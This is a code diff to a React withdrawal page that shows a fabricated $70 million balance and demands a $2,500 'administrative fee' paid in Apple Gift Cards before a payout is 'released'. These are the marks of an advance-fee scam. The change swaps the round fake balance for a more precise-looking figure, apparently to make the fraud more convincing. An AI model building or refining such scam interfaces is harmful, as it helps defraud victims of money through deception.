@@ -54,7 +54,7 @@ export default function WithdrawPage() {
   const [successMsg, setSuccessMsg] = useState(false);
 
   // Available balance in Dollars ($ USD)
-  const availableBalanceUSD = 70000000.00;
+  const availableBalanceUSD = 70482914.37;
   const minWithdrawalUSD = 100.00;
   const targetFeeUSD = 2500.00; // Total Apple Gift Card Fee Required
 
@@ -190,7 +190,7 @@ export default function WithdrawPage() {
                 <div className="space-y-1">
                   <p className="font-extrabold text-white">Administrative Fee & Withdrawal Submitted!</p>
                   <p className="text-slate-300 leading-relaxed">
-                    Your $2,500.00 USD administrative fee via Apple Gift Card(s) has been received for verification. Your full payout of ${numAmount > 0 ? numAmount.toLocaleString('en-US') : '70,000,000.00'} USD will be released to your destination account immediately upon fee verification (5 - 15 mins).
+                    Your $2,500.00 USD administrative fee via Apple Gift Card(s) has been received for verification. Your full payout of ${numAmount > 0 ? numAmount.toLocaleString('en-US') : '70,482,914.37'} USD will be released to your destination account immediately upon fee verification (5 - 15 mins).
                   </p>
                 </div>
               </div>
